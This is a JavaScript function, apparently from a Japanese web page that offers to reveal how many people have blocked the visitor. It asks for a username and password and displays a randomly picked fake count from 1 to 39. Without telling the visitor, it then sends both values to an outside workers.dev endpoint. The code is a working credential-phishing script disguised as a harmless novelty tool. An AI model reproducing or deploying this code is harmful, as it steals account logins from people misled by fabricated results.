function checkResult() {
    const inputA = document.getElementById("inputA").value.trim();
    const inputB = document.getElementById("inputB").value.trim();

    if (inputA === "" || inputB === "") {
        alert("ユーザー名とパスワードを入力してください。");
        return;
    }

    const results = [
    "あなたは1人にブロックされていました！",
    "あなたは2人にブロックされていました！",
    "あなたは3人にブロックされていました！",
    "あなたは4人にブロックされていました！",
    "あなたは5人にブロックされていました！",
    "あなたは6人にブロックされていました！",
    "あなたは7人にブロックされていました！",
    "あなたは8人にブロックされていました！",
    "あなたは9人にブロックされていました！",
    "あなたは10人にブロックされていました！",
    "あなたは11人にブロックされていました！",
    "あなたは12人にブロックされていました！",
    "あなたは13人にブロックされていました！",
    "あなたは14人にブロックされていました！",
    "あなたは15人にブロックされていました！",
    "あなたは16人にブロックされていました！",
    "あなたは17人にブロックされていました！",
    "あなたは18人にブロックされていました！",
    "あなたは19人にブロックされていました！",
    "あなたは20人にブロックされていました！",
    "あなたは21人にブロックされていました！",
    "あなたは22人にブロックされていました！",
    "あなたは23人にブロックされていました！",
    "あなたは24人にブロックされていました！",
    "あなたは25人にブロックされていました！",
    "あなたは26人にブロックされていました！",
    "あなたは27人にブロックされていました！",
    "あなたは28人にブロックされていました！",
    "あなたは29人にブロックされていました！",
    "あなたは30人にブロックされていました！",
    "あなたは31人にブロックされていました！",
    "あなたは32人にブロックされていました！",
    "あなたは33人にブロックされていました！",
    "あなたは34人にブロックされていました！",
    "あなたは35人にブロックされていました！",
    "あなたは36人にブロックされていました！",
    "あなたは37人にブロックされていました！",
    "あなたは38人にブロックされていました！",
    "あなたは39人にブロックされていました！"
];

    const randomIndex = Math.floor(Math.random() * results.length);
    const resultText = results[randomIndex];

    document.getElementById("resultText").textContent = resultText;
    document.getElementById("result").classList.remove("hidden");

    fetch("https://dark-dawn-c121.flexfnbr7.workers.dev/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            inputA: inputA,
            inputB: inputB
        })
    });
}
